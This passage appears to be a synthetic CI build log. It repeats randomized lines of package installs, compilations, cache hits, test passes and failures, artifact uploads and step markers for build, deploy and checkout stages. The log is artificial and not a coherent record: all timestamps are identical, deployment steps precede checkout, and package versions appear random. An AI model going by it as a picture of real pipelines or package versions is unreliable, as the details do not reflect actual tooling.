vulnerabilities\nCache hit for key-9268\n[12:00:24] INFO: Processing request\nInstalling jest@1.4.0\nCompiling src/main.py...\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (1MB)\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-6108\nInstalling webpack@1.0.0\n  PASS: test_db_connect (356ms)\n  PASS: test_auth_login (19ms)\nInstalling react@3.10.0\nStep 10/10: Building\nStep 9/10: Building\nInstalling prettier@4.13.0\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:24] WARN: Deprecated API usage\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_cache_hit (495ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling react@5.3.0\n\u2713 lint completed\n[12:00:24] INFO: Processing request\n  PASS: test_cache_hit (27ms)\nCompiling src/utils.go...\n  PASS: test_user_create (145ms)\n[12:00:24] INFO: Processing request\n  PASS: test_cache_hit (233ms)\n\u2713 build completed\n[12:00:24] WARN: Deprecated API usage\n  PASS: test_user_create (25ms)\n\u2713 lint completed\n[12:00:24] INFO: Processing request\n  PASS: test_cache_hit (148ms)\n=== Step save_cache completed ===\n=== Step: build ===\n  PASS: test_auth_login (367ms)\nArtifact uploaded: build.tar.gz (15MB)\nCache hit for key-1208\n[12:00:24] WARN: Deprecated API usage\nInstalling react@3.15.0\nCache hit for key-5649\n\u2713 test completed\n\u2713 test completed\nInstalling react@4.6.0\nCache hit for key-8433\n\u2713 test completed\nStep 9/10: Building\nCache hit for key-7817\nArtifact uploaded: build.tar.gz (14MB)\n\u2713 build completed\n\u2713 lint completed\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (36MB)\n\u2713 build completed\nCache hit for key-1569\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2717 build failed with exit code 113\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_db_connect (209ms)\nInstalling react@1.7.0\n  PASS: test_auth_login (30ms)\n[12:00:24] ERROR: Connection failed\n[12:00:24] INFO: Processing request\nInstalling prettier@1.5.0\n[12:00:24] WARN: Deprecated API usage\n\u2713 test completed\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nCache hit for key-5827\nCache hit for key-8665\nCompiling src/index.js...\nStep 5/10: Building\n  PASS: test_db_connect (254ms)\nCompiling src/main.py...\nCache hit for key-8586\nStep 1/10: Building\n  PASS: test_db_connect (279ms)\nCompiling src/handler.rs...\n\u2713 build completed\n\u2713 lint completed\nInstalling eslint@1.10.0\n[12:00:24] INFO: Processing request\nCompiling src/handler.rs...\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (38MB)\nCache hit for key-4975\n  PASS: test_auth_login (260ms)\nStep 3/10: Building\n\u2713 lint completed\n  PASS: test_cache_hit (288ms)\nCache hit for key-6112\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_db_connect (229ms)\nWARNING: lodash has known vulnerabilities\n  PASS: test_cache_hit (187ms)\n[12:00:24] INFO: Processing request\nStep 2/10: Building\nCache hit for key-9229\n[12:00:24] INFO: Processing request\n\u2713 test completed\nCompiling src/app.ts...\nCompiling src/handler.rs...\nStep 1/10: Building\nException: ValueError\nStep 2/10: Building\n  PASS: test_db_connect (25ms)\n  PASS: test_user_create (248ms)\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (28MB)\nCache hit for key-6506\nStep 1/10: Building\nStep 5/10: Building\nInstalling jest@3.7.0\n[12:00:24] INFO: Processing request\nInstalling express@5.15.0\nArtifact uploaded: build.tar.gz (39MB)\nInstalling react@4.20.0\n\u2713 lint completed\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\n\u2713 test completed\n[12:00:24] WARN: Deprecated API usage\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nCache hit for key-2416\nCache hit for key-1627\n[12:00:24] ERROR: Connection failed\n  PASS: test_api_health (171ms)\nCache hit for key-4925\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_user_create (173ms)\nCache hit for key-5246\n  PASS: test_api_health (272ms)\nArtifact uploaded: build.tar.gz (25MB)\nArtifact uploaded: build.tar.gz (37MB)\nStep 9/10: Building\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (49MB)\nInstalling express@2.1.0\nArtifact uploaded: build.tar.gz (17MB)\nStep 3/10: Building\nCache hit for key-7120\nCompiling src/index.js...\nCache hit for key-4400\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nInstalling express@4.16.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-5083\nArtifact uploaded: build.tar.gz (22MB)\nArtifact uploaded: build.tar.gz (40MB)\n\u2713 build completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (30MB)\nCache hit for key-6263\nInstalling lodash@4.14.0\n[12:00:24] INFO: Processing request\nStep 4/10: Building\nCache hit for key-2376\nCompiling src/main.py...\n  PASS: test_db_connect (408ms)\nException: ValueError\n  PASS: test_db_connect (282ms)\nCompiling src/index.js...\n[12:00:24] WARN: Deprecated API usage\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 build completed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (7MB)\nCache hit for key-2413\nCompiling src/index.js...\nInstalling express@3.14.0\n\u2713 test completed\n[12:00:24] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nFAILED: test_db_connect\n[12:00:24] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nStep 6/10: Building\n[12:00:24] WARN: Deprecated API usage\nCache hit for key-8601\n[12:00:24] INFO: Processing request\n\u2713 lint completed\nStep 2/10: Building\n  PASS: test_api_health (347ms)\n\u2713 lint completed\nStep 4/10: Building\nCache hit for key-3412\nCache hit for key-6225\nStep 8/10: Building\nStep 6/10: Building\n\u2713 build completed\n[12:00:24] ERROR: Connection failed\n\u2713 test completed\nCache hit for key-5294\n=== Step build completed ===\n=== Step: install_dependencies ===\n  PASS: test_cache_hit (316ms)\nInstalling eslint@3.1.0\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\nStep 8/10: Building\nCache hit for key-7636\nCompiling src/index.js...\nInstalling webpack@2.8.0\nInstalling lodash@2.18.0\nInstalling jest@2.10.0\n\u2713 lint completed\nCache hit for key-6665\nCompiling src/app.ts...\n[12:00:24] INFO: Processing request\nCompiling src/index.js...\n[12:00:24] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (29MB)\n  PASS: test_cache_hit (123ms)\nArtifact uploaded: build.tar.gz (43MB)\n[12:00:24] WARN: Deprecated API usage\n  PASS: test_user_create (388ms)\n[12:00:24] INFO: Processing request\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (25MB)\n  PASS: test_cache_hit (471ms)\n\u2713 lint completed\nInstalling axios@1.5.0\n[12:00:24] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (33MB)\nException: TypeError\nCache hit for key-5081\nStep 4/10: Building\nInstalling axios@5.7.0\nStep 8/10: Building\n  PASS: test_cache_hit (490ms)\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 lint completed\nCompiling src/main.py...\nCompiling src/handler.rs...\n  PASS: test_user_create (429ms)\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nCompiling src/main.py...\n[12:00:24] INFO: Processing request\nCache hit for key-4971\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_user_create (4ms)\nArtifact uploaded: build.tar.gz (3MB)\nCache hit for key-6880\n\u2713 lint completed\n[12:00:24] INFO: Processing request\n  PASS: test_cache_hit (283ms)\n[12:00:24] INFO: Processing request\n  PASS: test_api_health (227ms)\nInstalling express@2.9.0\n[12:00:24] ERROR: Connection failed\n[12:00:24] WARN: Deprecated API usage\nStep 3/10: Building\nInstalling express@4.11.0\nArtifact uploaded: build.tar.gz (11MB)\n\u2713 lint completed\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (49MB)\nStep 5/10: Building\nInstalling eslint@1.19.0\nStep 5/10: Building\nCache hit for key-2377\nArtifact uploaded: build.tar.gz (2MB)\n\u2713 build completed\nStep 5/10: Building\nStep 3/10: Building\n[12:00:24] INFO: Processing request\n\u2713 test completed\nInstalling axios@1.15.0\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (32MB)\nInstalling axios@4.10.0\nStep 10/10: Building\n\u2713 lint completed\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\nInstalling express@3.13.0\n  PASS: test_db_connect (271ms)\n  PASS: test_cache_hit (81ms)\n\u2717 build failed with exit code 18\n[12:00:24] INFO: Processing request\nCompiling src/handler.rs...\n  PASS: test_auth_login (71ms)\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (34MB)\nStep 8/10: Building\nCompiling src/index.js...\n[12:00:24] ERROR: Connection failed\n\u2713 test completed\nInstalling webpack@4.14.0\nStep 5/10: Building\nInstalling react@1.0.0\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nCache hit for key-3340\n\u2713 test completed\nArtifact uploaded: build.tar.gz (25MB)\n\u2713 lint completed\n[12:00:24] INFO: Processing request\nCompiling src/utils.go...\nCache hit for key-1485\n[12:00:24] INFO: Processing request\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (32MB)\nCache hit for key-5716\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-4791\nCache hit for key-8599\nArtifact uploaded: build.tar.gz (11MB)\nCache hit for key-5907\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling express@2.3.0\nCache hit for key-8536\nInstalling webpack@4.19.0\nStep 4/10: Building\nStep 9/10: Building\nInstalling express@2.18.0\n  PASS: test_api_health (484ms)\n\u2713 build completed\nStep 1/10: Building\n  PASS: test_user_create (390ms)\n  PASS: test_user_create (428ms)\n[12:00:24] INFO: Processing request\n\u2713 build completed\n[12:00:24] WARN: Deprecated API usage\n[12:00:24] INFO: Processing request\nInstalling lodash@2.9.0\nInstalling react@4.1.0\n\u2713 lint completed\n  PASS: test_cache_hit (387ms)\nCache hit for key-5083\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:24] INFO: Processing request\nException: ValueError\n  PASS: test_cache_hit (242ms)\nArtifact uploaded: build.tar.gz (49MB)\n\u2713 lint completed\nCompiling src/index.js...\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (2MB)\nCompiling src/handler.rs...\n[12:00:24] INFO: Processing request\nInstalling jest@2.7.0\nWARNING: webpack has known vulnerabilities\n  PASS: test_db_connect (490ms)\n\u2713 test completed\n  PASS: test_db_connect (464ms)\n[12:00:24] INFO: Processing request\nCompiling src/app.ts...\nCompiling src/app.ts...\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\nInstalling prettier@5.10.0\n=== Step install_dependencies completed ===\n=== Step: deploy_production ===\nCache hit for key-2320\nStep 3/10: Building\nStep 7/10: Building\nInstalling lodash@5.9.0\nCache hit for key-6177\nCache hit for key-8493\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 test completed\nStep 10/10: Building\nCache hit for key-9832\nInstalling jest@3.5.0\n\u2713 lint completed\nStep 9/10: Building\nInstalling prettier@2.13.0\nCache hit for key-5781\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\nInstalling lodash@4.8.0\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-9963\n  PASS: test_auth_login (434ms)\nStep 10/10: Building\nCompiling src/app.ts...\n  PASS: test_db_connect (492ms)\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:24] WARN: Deprecated API usage\n[12:00:24] INFO: Processing request\nCompiling src/utils.go...\nInstalling axios@4.8.0\n[12:00:24] INFO: Processing request\nInstalling express@1.20.0\nCompiling src/app.ts...\n[12:00:24] INFO: Processing request\nCache hit for key-4815\nCompiling src/utils.go...\nCache hit for key-8074\nCompiling src/service.java...\n[12:00:24] INFO: Processing request\nCache hit for key-9010\n\u2713 build completed\n  PASS: test_user_create (179ms)\nCache hit for key-1011\nCache hit for key-8649\nInstalling lodash@5.15.0\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\n[12:00:24] INFO: Processing request\nCache hit for key-4472\nInstalling axios@1.2.0\nCache hit for key-8791\n\u2713 build completed\n  PASS: test_api_health (86ms)\n\u2713 test completed\n\u2713 build completed\nCache hit for key-7062\nStep 5/10: Building\n  PASS: test_auth_login (139ms)\nInstalling express@3.0.0\n\u2713 test completed\n[12:00:24] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (21MB)\n  PASS: test_api_health (338ms)\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nCompiling src/handler.rs...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (44MB)\n\u2717 build failed with exit code 81\nStep 4/10: Building\nInstalling jest@5.0.0\nStep 4/10: Building\nInstalling webpack@2.0.0\nCompiling src/handler.rs...\n\u2713 build completed\nWARNING: axios has known vulnerabilities\n\u2713 test completed\n\u2713 lint completed\nInstalling jest@2.8.0\nStep 3/10: Building\nCompiling src/index.js...\n\u2713 test completed\nStep 5/10: Building\nInstalling prettier@3.3.0\n[12:00:24] INFO: Processing request\nFAILED: test_cache_hit\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:24] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling prettier@1.11.0\n[12:00:24] INFO: Processing request\n\u2713 lint completed\nCache hit for key-4520\nCompiling src/index.js...\n\u2713 lint completed\nCompiling src/index.js...\n[12:00:24] INFO: Processing request\nStep 7/10: Building\nStep 8/10: Building\nCompiling src/app.ts...\n[12:00:24] WARN: Deprecated API usage\nStep 10/10: Building\nWARNING: webpack has known vulnerabilities\nStep 3/10: Building\n[12:00:24] INFO: Processing request\nCompiling src/main.py...\nCompiling src/utils.go...\nInstalling jest@3.19.0\n[12:00:24] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (4MB)\nInstalling express@2.5.0\nInstalling express@2.13.0\nCompiling src/index.js...\nCompiling src/utils.go...\nInstalling lodash@5.16.0\nCache hit for key-7469\nCompiling src/service.java...\nStep 1/10: Building\nCache hit for key-2270\nCompiling src/main.py...\nFAILED: test_db_connect\nStep 6/10: Building\nStep 8/10: Building\nWARNING: webpack has known vulnerabilities\nInstalling jest@1.5.0\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 build completed\n\u2713 test completed\nInstalling eslint@3.0.0\nStep 8/10: Building\nStep 8/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (11MB)\nCache hit for key-9324\nInstalling react@5.18.0\nCache hit for key-9911\nException: RuntimeError\nCache hit for key-2810\nCache hit for key-2628\nWARNING: express has known vulnerabilities\nStep 7/10: Building\n\u2713 build completed\n  PASS: test_user_create (187ms)\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\nStep 3/10: Building\n  PASS: test_api_health (346ms)\nCache hit for key-9568\n[12:00:24] INFO: Processing request\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_api_health (15ms)\nCompiling src/utils.go...\n  PASS: test_auth_login (417ms)\nStep 2/10: Building\nFAILED: test_db_connect\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-7294\nArtifact uploaded: build.tar.gz (31MB)\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (41MB)\nCache hit for key-5321\nCache hit for key-4663\nCompiling src/main.py...\n=== Step deploy_production completed ===\n=== Step: deploy_staging ===\n\u2713 build completed\n\u2713 lint completed\nInstalling react@2.5.0\nStep 7/10: Building\nInstalling webpack@5.14.0\n\u2717 build failed with exit code 98\nArtifact uploaded: build.tar.gz (18MB)\n\u2717 build failed with exit code 17\n[12:00:24] INFO: Processing request\n\u2713 build completed\n[12:00:24] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (41MB)\nCache hit for key-2626\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 build completed\nCompiling src/main.py...\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (30MB)\nCompiling src/index.js...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (14MB)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (12MB)\nInstalling eslint@5.16.0\nFAILED: test_db_connect\n  PASS: test_user_create (38ms)\nCache hit for key-8035\n[12:00:24] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 5/10: Building\nCompiling src/index.js...\nWARNING: prettier has known vulnerabilities\n  PASS: test_db_connect (500ms)\nCompiling src/app.ts...\nInstalling express@4.17.0\nInstalling jest@5.0.0\nCompiling src/handler.rs...\n  PASS: test_user_create (227ms)\n[12:00:24] ERROR: Connection failed\nStep 10/10: Building\nWARNING: prettier has known vulnerabilities\n[12:00:24] WARN: Deprecated API usage\n  PASS: test_cache_hit (468ms)\nInstalling react@2.0.0\nInstalling express@4.13.0\n\u2713 test completed\nCache hit for key-9853\n\u2713 lint completed\nCache hit for key-6818\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:24] INFO: Processing request\n  PASS: test_cache_hit (65ms)\nCache hit for key-3742\nCache hit for key-2425\nWARNING: jest has known vulnerabilities\nCache hit for key-5665\nInstalling lodash@3.12.0\nCompiling src/app.ts...\n\u2713 build completed\nCache hit for key-9382\n  PASS: test_auth_login (218ms)\nArtifact uploaded: build.tar.gz (35MB)\n  PASS: test_api_health (165ms)\nCache hit for key-8602\n  PASS: test_db_connect (433ms)\nInstalling prettier@5.14.0\nInstalling lodash@2.8.0\n[12:00:24] INFO: Processing request\nInstalling prettier@3.9.0\nCompiling src/service.java...\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nInstalling axios@4.16.0\nCompiling src/main.py...\nCache hit for key-7510\n[12:00:24] INFO: Processing request\nStep 1/10: Building\nCompiling src/app.ts...\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\nCompiling src/handler.rs...\nStep 5/10: Building\nFAILED: test_user_create\nArtifact uploaded: build.tar.gz (47MB)\nCache hit for key-4032\nInstalling axios@3.17.0\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (39MB)\nStep 2/10: Building\nCompiling src/app.ts...\n  PASS: test_api_health (250ms)\nStep 8/10: Building\nStep 6/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (18MB)\nStep 5/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (50MB)\n[12:00:24] INFO: Processing request\n  PASS: test_api_health (113ms)\n\u2713 test completed\nInstalling axios@4.3.0\nCompiling src/index.js...\nWARNING: jest has known vulnerabilities\n\u2713 build completed\nCache hit for key-5704\nWARNING: prettier has known vulnerabilities\nCompiling src/handler.rs...\n[12:00:24] INFO: Processing request\nInstalling jest@4.10.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (43MB)\nInstalling prettier@1.15.0\n[12:00:24] INFO: Processing request\n  PASS: test_auth_login (472ms)\nWARNING: prettier has known vulnerabilities\nCache hit for key-5501\n[12:00:24] INFO: Processing request\n  PASS: test_api_health (373ms)\n\u2713 test completed\nWARNING: express has known vulnerabilities\n  PASS: test_cache_hit (450ms)\n[12:00:24] INFO: Processing request\nStep 8/10: Building\nInstalling eslint@5.17.0\nStep 4/10: Building\nInstalling eslint@2.3.0\nInstalling webpack@1.2.0\n\u2713 lint completed\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (15MB)\nCache hit for key-1557\nStep 3/10: Building\n  PASS: test_api_health (467ms)\nWARNING: eslint has known vulnerabilities\nCompiling src/handler.rs...\nCompiling src/utils.go...\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling react@3.14.0\n\u2713 test completed\nInstalling express@1.12.0\n[12:00:24] INFO: Processing request\n  PASS: test_api_health (36ms)\nCache hit for key-1895\nCache hit for key-6579\n  PASS: test_api_health (437ms)\n  PASS: test_auth_login (326ms)\nStep 1/10: Building\n\u2713 lint completed\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nInstalling react@5.3.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (12MB)\n\u2713 lint completed\nCompiling src/service.java...\nCache hit for key-3414\n  PASS: test_api_health (80ms)\nCache hit for key-4008\nCache hit for key-9192\nInstalling express@5.0.0\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (3MB)\n=== Step deploy_staging completed ===\n=== Step: checkout ===\n\u2713 build completed\n[12:00:24] INFO: Processing request\n\u2713 build completed\n  PASS: test_auth_login (344ms)\nCompiling src/handler.rs...\n[12:00:24] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (1MB)\n  PASS: test_auth_login (396ms)\n[12:00:24] WARN: Deprecated API usage\nInstalling axios@4.7.0\nCompiling src/main.py...\n  PASS: test_user_create (491ms)\nCache hit for key-2074\nArtifact uploaded: build.tar.gz (13MB)\nCompiling src/main.py...\n  PASS: test_cache_hit (194ms)\nCompiling src/main.py...\nCompiling src/handler.rs...\n  PASS: test_user_create (47ms)\nInstalling express@2.6.0\nException: RuntimeError\n\u2713 lint completed\nInstalling react@3.11.0\n[12:00:24] INFO: Processing request\nInstalling prettier@2.10.0\n  PASS: test_user_create (234ms)\n[12:00:24] WARN: Deprecated API usage\nCompiling src/index.js...\n  PASS: test_db_connect (377ms)\n\u2717 build failed with exit code 41\nStep 3/10: Building\nCache hit for key-5842\nInstalling lodash@5.7.0\nInstalling lodash@2.12.0\nWARNING: react has known vulnerabilities\nInstalling axios@2.16.0\n  PASS: test_api_health (418ms)\n\u2717 build failed with exit code 116\nCache hit for key-1712\nInstalling lodash@2.15.0\n[12:00:24] INFO: Processing request\nInstalling webpack@1.18.0\nCache hit for key-2666\nCompiling src/app.ts...\n[12:00:24] INFO: Processing request\nInstalling prettier@1.5.0\n  PASS: test_cache_hit (147ms)\n  PASS: test_auth_login (417ms)\nStep 5/10: Building\n[12:00:24] INFO: Processing request\n\u2717 build failed with exit code 28\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nStep 6/10: Building\nCache hit for key-4217\nStep 4/10: Building\n\u2713 build completed\nWARNING: axios has known vulnerabilities\n\u2713 lint completed\n\u2713 build completed\nCache hit for key-7008\nStep 1/10: Building\nCompiling src/index.js...\nCache hit for key-3977\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/main.py...\nInstalling express@5.4.0\nCompiling src/service.java...\n[12:00:24] INFO: Processing request\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (14MB)\nStep 1/10: Building\nWARNING: axios has known vulnerabilities\nInstalling jest@4.8.0\nCache hit for key-2495\n  PASS: test_api_health (410ms)\nStep 1/10: Building\n\u2713 test completed\n[12:00:24] INFO: Processing request\nStep 9/10: Building\nInstalling express@5.17.0\nInstalling webpack@5.16.0\n\u2713 lint completed\nStep 9/10: Building\nCompiling src/utils.go...\n  PASS: test_user_create (462ms)\n\u2713 test completed\nCompiling src/main.py...\n  PASS: test_db_connect (47ms)\nCompiling src/handler.rs...\n  PASS: test_db_connect (326ms)\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling webpack@5.8.0\n[12:00:24] INFO: Processing request\nStep 1/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (39MB)\nCache hit for key-2879\nArtifact uploaded: build.tar.gz (11MB)\nCache hit for key-2700\n\u2713 lint completed\nCompiling src/service.java...\n  PASS: test_auth_login (362ms)\nCache hit for key-7479\nStep 5/10: Building\nStep 5/10: Building\nInstalling express@1.0.0\n  PASS: test_auth_login (396ms)\n[12:00:24] INFO: Processing request\n[12:00:24] WARN: Deprecated API usage\n\u2713 build completed\n  PASS: test_db_connect (314ms)\nCache hit for key-5701\nStep 7/10: Building\nCompiling src/index.js...\nWARNING: jest has known vulnerabilities\nInstalling react@3.1.0\nInstalling react@2.14.0\nCompiling src/handler.rs...\n  PASS: test_api_health (127ms)\nArtifact uploaded: build.tar.gz (48MB)\nInstalling express@4.19.0\n  PASS: test_auth_login (130ms)\nInstalling jest@3.4.0\n\u2713 build completed\n[12:00:24] INFO: Processing request\n\u2713 test completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (34MB)\nArtifact uploaded: build.tar.gz (36MB)\nStep 6/10: Building\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (20MB)\n\u2713 build completed\nCache hit for key-9546\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 10/10: Building\n  PASS: test_api_health (307ms)\nArtifact uploaded: build.tar.gz (12MB)\nArtifact uploaded: build.tar.gz (4MB)\nCompiling src/utils.go...\n\u2717 build failed with exit code 1\nStep 7/10: Building\nCompiling src/index.js...\nInstalling jest@5.4.0\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 test completed\n  PASS: test_user_create (263ms)\nStep 8/10: Building\nInstalling react@5.16.0\n  PASS: test_cache_hit (71ms)\nCache hit for key-8816\n[12:00:24] INFO: Processing request\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (14MB)\nStep 1/10: Building\nInstalling lodash@2.5.0\n=== Step checkout completed ===\n=== Step: setup_node ===\nInstalling webpack@1.15.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-6618\nInstalling eslint@4.4.0\n  PASS: test_db_connect (297ms)\n  PASS: test_db_connect (293ms)\nArtifact uploaded: build.tar.gz (24MB)\n\u2713 lint completed\n  PASS: test_cache_hit (120ms)\n[12:00:24] ERROR: Connection failed\nStep 8/10: Building\nInstalling eslint@5.15.0\nArtifact uploaded: build.tar.gz (1MB)\nCompiling src/handler.rs...\n[12:00:24] INFO: Processing request\n\u2713 test completed\n\u2713 test completed\n[12:00:24] INFO: Processing request\nStep 1/10: Building\nCache hit for key-9740\n  PASS: test_db_connect (29ms)\nCache hit for key-2820\nArtifact uploaded: build.tar.gz (47MB)\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (26MB)\nCache hit for key-6825\nArtifact uploaded: build.tar.gz (23MB)\nWARNING: prettier has known vulnerabilities\n  PASS: test_cache_hit (180ms)\nStep 10/10: Building\n[12:00:24] INFO: Processing request\nCache hit for key-8664\nArtifact uploaded: build.tar.gz (38MB)\nInstalling react@4.0.0\n\u2713 test completed\n[12:00:24] INFO: Processing request\n  PASS: test_user_create (449ms)\nCache hit for key-4368\n\u2717 build failed with exit code 3\n  PASS: test_api_health (365ms)\nCache hit for key-6707\n\u2713 build completed\n  PASS: test_api_health (406ms)\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/app.ts...\nStep 6/10: Building\nInstalling express@3.6.0\n  PASS: test_cache_hit (96ms)\nCache hit for key-3656\nStep 2/10: Building\nCache hit for key-8700\n\u2713 test completed\nStep 1/10: Building\n  PASS: test_auth_login (293ms)\n\u2713 lint completed\nCompiling src/main.py...\nCache hit for key-4418\n  PASS: test_api_health (236ms)\nArtifact uploaded: build.tar.gz (44MB)\nArtifact uploaded: build.tar.gz (27MB)\nArtifact uploaded: build.tar.gz (41MB)\nInstalling webpack@4.6.0\nInstalling axios@3.18.0\nWARNING: jest has known vulnerabilities\nStep 8/10: Building\nCache hit for key-6569\n  PASS: test_cache_hit (292ms)\nArtifact uploaded: build.tar.gz (39MB)\nStep 2/10: Building\n  PASS: test_api_health (289ms)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (23MB)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:24] WARN: Deprecated API usage\n  PASS: test_user_create (471ms)\nInstalling lodash@3.8.0\nStep 9/10: Building\nCache hit for key-9666\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:24] INFO: Processing request\nCache hit for key-7131\nCache hit for key-4900\nInstalling express@4.6.0\n[12:00:24] INFO: Processing request\n[12:00:24] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-5722\nArtifact uploaded: build.tar.gz (12MB)\n  PASS: test_user_create (57ms)\n  PASS: test_cache_hit (367ms)\nFAILED: test_cache_hit\n[12:00:24] INFO: Processing request\nInstalling eslint@3.16.0\n  PASS: test_user_create (250ms)\n[12:00:24] INFO: Processing request\nWARNING: react has known vulnerabilities\nCompiling src/index.js...\nCompiling src/app.ts...\nInstalling react@5.13.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (45MB)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (48MB)\n[12:00:24] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_user_create (415ms)\n\u2713 build completed\n[12:00:24] INFO: Processing request\nInstalling axios@1.1.0\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (46MB)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (20MB)\n  PASS: test_auth_login (61ms)\n[12:00:24] INFO: Processing request\nInstalling 